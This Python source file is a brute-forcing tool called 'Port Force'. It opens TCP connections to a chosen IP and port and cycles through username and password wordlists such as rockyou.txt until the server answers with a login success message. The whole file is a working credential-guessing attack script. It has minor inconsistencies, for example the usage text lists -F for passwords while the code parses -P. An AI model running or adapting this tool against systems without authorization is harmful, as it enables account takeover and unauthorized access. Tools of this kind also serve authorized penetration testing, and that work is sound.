#!/usr/bin/python3

import socket
import sys
import getopt
import os
import time

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(bcolors.HEADER + "    ____             __     ______                   " + bcolors.ENDC)
    print(bcolors.HEADER + "   / __ \\____  _____/ /_   / ____/___  _____________ " + bcolors.ENDC)
    print(bcolors.HEADER + "  / /_/ / __ \\/ ___/ __/  / /_  / __ \\/ ___/ ___/ _ \\" + bcolors.ENDC)
    print(bcolors.HEADER + " / ____/ /_/ / /  / /_   / __/ / /_/ / /  / /__/  __/" + bcolors.ENDC)
    print(bcolors.HEADER + "/_/    \\____/_/   \\__/  /_/    \\____/_/   \\___/\\___/ " + bcolors.ENDC)
    print()
    print(bcolors.HEADER + "             Created By: CJ Gladish            " + bcolors.ENDC)
    print()
    print()

def usage():
    print("Port Force - A custom port Brute Forcing Tool")
    print("---------------------------------------------")
    print()
    print("Usage: ./port_force -t 192.168.0.1 -p 1234 -u users.txt -P pass.txt")
    print()
    print("-h --help            - display usage information")
    print("-t --target          - set IP address of Target")
    print("-p --port            - set Port for Target")
    print("-u --user            - set a list of usernames to brute force")
    print("-F --pass            - set a list of passwords to brute force")
    print()
    print("Examples:")
    print("---------------------------------------------")
    print("./port_force -t 192.168.0.1 -p 1234 -u names.txt -P pass.txt")
    print("./port_force -t 192.168.0.1 -p 1234 -u users.txt -P pass.txt")
    print("./port_force --target 192.168.0.1 --port 1234 --user names.txt --pass pass.txt")
    print("./port_force -t 192.168.0.1 -p 1234 -u name.txt -P /usr/share/wordlists/rockyou.txt")

def main():
    target = ""
    port = 0
    var_user = ""
    var_pass = ""
    user_len = 0
    cur_user = 0
    pass_len = 0
    cur_pass = 0

    banner()

    if not len(sys.argv[1:]):
        usage()
        sys.exit(1)

    try:
        opts, args = getopt.getopt(sys.argv[1:], "h:t:p:u:P:", ["help", "target=", "port=", "user=", "pass="])
    except getopt.GetoptError as err:
        print(bcolors.FAIL + "[ERROR] - " + str(err) + "\n" + bcolors.ENDC)
        usage()
        sys.exit(2)

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            sys.exit()
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-p", "--port"):
            port = int(arg)
        elif opt in ("-u", "--user"):
            var_user = arg
        elif opt in ("-P", "--pass"):
            var_pass = arg
        else:
            assert False, "Unhandled Option"

    # Check if userlist exists:
    if not os.path.exists(var_user):
        sys.stderr.write(bcolors.FAIL + "[ERROR] - Userlist was not found!\n" + bcolors.ENDC)
        sys.exit(1)

    # Check if passwordlist exists
    if not os.path.exists(var_pass):
        sys.stderr.write(bcolors.FAIL + "[ERROR] - Passwordlist was not found!\n" + bcolors.ENDC)
        sys.exit(1)
    else:
        print(bcolors.OKGREEN + "[+] Loading Username and Password List...\n" + bcolors.ENDC)
        time.sleep(3)

    with open(var_user) as uFile:
        user_len = len(uFile.readlines())

    with open(var_pass) as pFile:
        pass_len = len(pFile.readlines())

    print(bcolors.OKGREEN + f"[+] Attacking Target:{target} on Port:{port}\n" + bcolors.ENDC)
    time.sleep(3)

    print(bcolors.OKGREEN + f"[+] Pinging {target} to verify host connectivity...\n" + bcolors.ENDC)
    time.sleep(3)

    # Ping host to make sure it is up
    response = os.system(f"ping -n 1 {target} > nul")
    if response == 0:
        print(bcolors.OKGREEN + f"[OK] The host {target} is up!\n" + bcolors.ENDC)
    else:
        print(bcolors.WARNING + f"[FAIL] The host {target} is down! Shutting down...\n" + bcolors.ENDC)
        sys.exit(1)

    # Iterate through userlist and passwordlist
    with open(var_user, "r") as user_file:
        for user in user_file:
            cur_user += 1
            cur_pass = 0

            # Print current user being tested, and total number of users left
            print(bcolors.OKGREEN + f"[INFO] Testing User: {user.strip()} ({cur_user}/{user_len})" + bcolors.ENDC)
            time.sleep(3)

            with open(var_pass, "r") as pass_file:
                for passwd in pass_file:
                    cur_pass += 1
                    time_tag = time.strftime("%H:%M:%S")

                    # Print current Username and Password used for brute force
                    print(bcolors.OKBLUE + f"[{time_tag}]     [-] Trying {cur_pass} of {pass_len} - {user.strip()}:{passwd.strip()}" + bcolors.ENDC)
                    time.sleep(0.5)

                    # Connection
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target, port))
                    except:
                        print(bcolors.FAIL + "\n[ERROR] - Can't connect to the host!\n" + bcolors.ENDC)
                        sys.exit(1)

                                        # Request username
                    data = ""
                    s.settimeout(10)  # Add timeout for socket operations
                    try:
                        while True:
                            tmp = s.recv(1024).decode("utf-8")
                            if not tmp:
                                break
                            data += tmp
                            if "" in data:
                                break
                    except socket.timeout:
                        print(bcolors.WARNING + "[ERROR] - Timeout waiting for login prompt." + bcolors.ENDC)
                        s.close()
                        continue  # Move to the next username/password pair

                    # Send username
                    s.send((user.strip() + "\n").encode("utf-8"))

                    # Request password
                    data = ""
                    try:
                        while True:
                            tmp = s.recv(1024).decode("utf-8")
                            if not tmp:
                                break
                            data += tmp
                            if "Enter login:" in data:  # Replace "Enter login:" with the actual prompt
                                break
                    except socket.timeout:
                        print(bcolors.WARNING + "[ERROR] - Timeout waiting for login prompt." + bcolors.ENDC)
                        s.close()
                        continue


                    # Send password
                    s.send((passwd.strip() + "\n").encode("utf-8"))

                    # Evaluate response
                    try:
                        answer = s.recv(1024).decode("utf-8")
                        print(bcolors.OKBLUE + f"Server response: {answer}" + bcolors.ENDC)

                        if "Login successful" in answer:  # Replace with the actual success message
                            print(bcolors.OKGREEN + f"[{time_tag}]     [!] Success! {user.strip()}:{passwd.strip()}" + bcolors.ENDC)
                            s.close()
                            sys.exit(1)
                        else:
                            print(bcolors.FAIL + f"[{time_tag}]     [!] Failed: {user.strip()}:{passwd.strip()}" + bcolors.ENDC)
                    except socket.timeout:
                        print(bcolors.WARNING + "[ERROR] - Timeout waiting for server response." + bcolors.ENDC)

                    s.close()  # Ensure the socket is closed after every attempt


if __name__ == "__main__":
    main()
